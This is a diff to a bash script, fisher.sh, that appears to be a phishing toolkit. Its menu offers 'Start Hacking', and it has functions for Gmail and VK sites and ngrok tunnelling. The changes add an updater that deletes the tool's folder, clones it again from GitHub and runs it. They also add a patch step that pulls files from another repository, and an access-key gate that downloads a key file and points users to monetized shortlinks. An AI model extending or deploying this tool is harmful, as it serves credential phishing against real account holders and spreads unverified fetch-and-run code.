@@ -86,9 +86,9 @@ banner_small() {
 	cat <<- EOF
 	
 
- ${BLUE}   ░█▀▀▀ ▀█▀ ░█▀▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀█ 
- ${BLUE}   ░█▀▀▀ ░█─ ─▀▀▀▄▄ ░█▀▀█ ░█▀▀▀ ░█▄▄▀ 
- ${BLUE}   ░█─── ▄█▄ ░█▄▄▄█ ░█─░█ ░█▄▄▄ ░█─░█  ${WHITE} 2.1   
+ ${GREEN}   ░█▀▀▀ ▀█▀ ░█▀▀▀█ ░█─░█ ░█▀▀▀ ░█▀▀█ 
+ ${GREEN}   ░█▀▀▀ ░█─ ─▀▀▀▄▄ ░█▀▀█ ░█▀▀▀ ░█▄▄▀ 
+ ${GREEN}   ░█─── ▄█▄ ░█▄▄▄█ ░█─░█ ░█▄▄▄ ░█─░█  ${WHITE} 7.6  
 	              
 	EOF
 }
@@ -422,6 +422,80 @@ site_gmail() {
 	fi
 }
 
+##Update
+  upd(){
+if [ -d "$HOME/fisher" ];
+then
+cd $HOME
+rm -rf fisher
+elif [ -d "$HOME/fisher" ];
+then
+cd $HOME
+rm -rf fisher
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/jatinkalwar/fisher 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd fisher
+bash fisher.sh
+}
+
+###patch
+upda() {
+ 
+if [ -d "$HOME/fisher/server" ];
+then
+cd $HOME/fisher/server
+rm fisher3.txt
+elif [ -d "$HOME/fisher/server" ];
+then
+cd $HOME/fisher/server
+rm fisher3.txt
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATING NGROK, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           NGROK UPDATED SUCCESSFULLY (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd toolupdater/error
+mv fisher3.txt $HOME/fisher/server
+cd $HOME
+rm -rf toolupdater
+
+}
+
 ## Vk
 site_vk() {
 	cat <<- EOF
@@ -452,46 +526,84 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
      echo -e "\e[92m[\e[91m1\e[92m]\e[93m Start Hacking\e[93m"
-     echo -e "\e[92m[\e[91m2\e[92m]\e[93m About Me\e[93m"
-     echo -e "\e[92m[\e[91m3\e[92m]\e[93m Practicle Video\e[93m"
-     echo -e "\e[92m[\e[91m4\e[92m]\e[93m Visit Our Website\e[93m"
-     echo -e "\e[92m[\e[91m5\e[92m]\e[93m Follow Us On Instagram\e[93m"
-     echo -e "\e[92m[\e[91m6\e[92m]\e[93m Subscribe Our Channel\e[93m"
-     echo -e "\e[92m[\e[91m7\e[92m]\e[93m Join Our Whatsapp Group\e[93m"
-     echo -e "\e[92m[\e[91m8\e[92m]\e[93m Exit\e[93m"
+     echo -e "\e[92m[\e[91m2\e[92m]\e[93m Access Key\e[93m"
+     echo -e "\e[92m[\e[91m3\e[92m]\e[93m About Me\e[93m"
+     echo -e "\e[92m[\e[91m4\e[92m]\e[93m Practicle Video\e[93m"
+     echo -e "\e[92m[\e[91m5\e[92m]\e[93m Visit Our Website\e[93m"
+     echo -e "\e[92m[\e[91m6\e[92m]\e[93m Follow Us On Instagram\e[93m"
+     echo -e "\e[92m[\e[91m7\e[92m]\e[93m Subscribe Our Channel\e[93m"
+     echo -e "\e[92m[\e[91m8\e[92m]\e[93m Join Our Whatsapp Group\e[93m"
+     echo -e "\e[92m[\e[91m9\e[92m]\e[93m Update Tool\e[93m"
+     echo -e "\e[92m[\e[91m0\e[92m]\e[93m Exit\e[93m"
 
 echo ''
 echo -ne "SELECT OPTION ~> \e[0m"
 read opt1
 if [ $opt1 = "1" ];
 then
-jatt
+        cd $HOME/fisher
+wget -L https://raw.githubusercontent.com/jatinkalwar/toolupdater/main/error/fisher3.txt 2>/dev/null
+banner
+echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
+echo -e "\e[93m"
+read  -p "ACCESS KEY: " access
+cd $HOME/fisher/server
+bas=$(cat fisher3.txt)
+if [[ $access = $bas ]];
+then
+clear
+  banner
+  jatt
+        
+else
+echo " "
+echo -e "               \e[34m ============================\e[34m"
+echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m   |"
+echo -e "               \e[34m |                          |"
+echo -e "               \e[34m |    Use shortlink for key |"
+echo -e "               \e[34m |\e[92mhttps://gplinks.co/8QcyEeAZ\e[34m |"
+echo -e "               \e[34m |            [OR]          |"
+echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m|"
+echo -e "               \e[34m ============================\e[34m"
+echo " "
+sleep 3.0
+fi
+main_menu
 
 elif [ $opt1 = "2" ];
 then
-clear
-about
+am start -a android.intent.action.VIEW -d https://gplinks.co/8QcyEeAZ > /dev/null
+bash fisher.sh
+
 elif [ $opt1 = "3" ];
 then
-am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
-bash fisher.sh
+clear
+about
 elif [ $opt1 = "4" ];
 then
 am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
 bash fisher.sh
 elif [ $opt1 = "5" ];
 then
-am start -a android.intent.action.VIEW -d https://www.instagram.com/yourhackinghouse/ > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://bit.ly/3tPXkI3 > /dev/null
 bash fisher.sh
 elif [ $opt1 = "6" ];
 then
-am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMwPUQZrcSMzaW4yzhsXCXw > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://www.instagram.com/yourhackinghouse/ > /dev/null 2>&1
 bash fisher.sh
 elif [ $opt1 = "7" ];
 then
-am start -a android.intent.action.VIEW -d https://forms.gle/qcLLqJZ2U94sFzrF6 > /dev/null
+am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCMwPUQZrcSMzaW4yzhsXCXw > /dev/null 2>&1
 bash fisher.sh
 elif [ $opt1 = "8" ];
+then
+am start -a android.intent.action.VIEW -d https://forms.gle/qcLLqJZ2U94sFzrF6 > /dev/null
+bash fisher.sh
+elif [ $opt1 = "9" ];
+then
+clear
+upd
+elif [ $opt1 = "0" ];
 then
 		msg_exit
 	else
@@ -663,4 +775,7 @@ jatt() {
 kill_pid
 dependencies
 install_ngrok
+clear
+banner
+upda
 main_menu
